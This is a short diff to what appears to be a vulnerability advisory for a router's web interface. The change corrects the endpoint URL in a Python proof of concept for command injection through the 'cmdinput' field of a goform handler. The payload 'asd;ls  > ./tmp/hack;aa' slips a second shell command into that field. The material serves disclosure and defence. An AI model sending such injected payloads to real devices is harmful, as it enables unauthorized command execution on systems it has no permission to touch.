@@ -25,7 +25,7 @@ then pass to tpi_get_ping_output, split the string and call popen, cause command
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formexeCommand"
+url = "http://192.168.1.13/goform/exeCommand"
 payload = 'asd;ls  > ./tmp/hack;aa'
 
 r = requests.post(url, data={'cmdinput': payload})
